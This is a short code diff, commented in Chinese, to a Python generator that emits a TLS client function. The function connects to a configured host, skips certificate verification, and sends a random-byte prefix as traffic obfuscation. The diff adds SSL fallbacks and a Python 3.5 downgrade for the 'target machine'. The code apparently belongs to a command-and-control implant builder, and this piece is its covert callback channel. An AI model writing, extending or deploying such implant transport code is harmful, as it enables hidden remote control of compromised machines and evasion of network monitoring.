@@ -14,6 +14,7 @@ MODULE = {
 }
 
 
+from server.core.pycompat import downgrade_py35
 def run(host, port, key_hex, fingerprint):
     """生成 _nT() 实现：TLS 客户端 + 证书指纹 pin。
 
@@ -30,7 +31,7 @@ def _nT():
     s = _sa.socket()
     s.settimeout(30)
     s.connect(({host!r}, {port}))
-    ctx = _sl.SSLContext(_sl.PROTOCOL_TLS_CLIENT)
+    ctx = _sl.SSLContext(getattr(_sl,"PROTOCOL_TLS_CLIENT",_sl.PROTOCOL_SSLv23))
     ctx.check_hostname = False
     ctx.verify_mode = _sl.CERT_NONE
     t = ctx.wrap_socket(s)
@@ -41,4 +42,4 @@ def _nT():
     t.sendall(_os.urandom(256))  # 混淆: 首包随机前缀(proxy a2s 吞掉;TLS 变体连 proxy 走 TCP 语义)
     return t
 '''
-    return code
+    return downgrade_py35(code)   # 目标机 py3.5: f-string → str.format
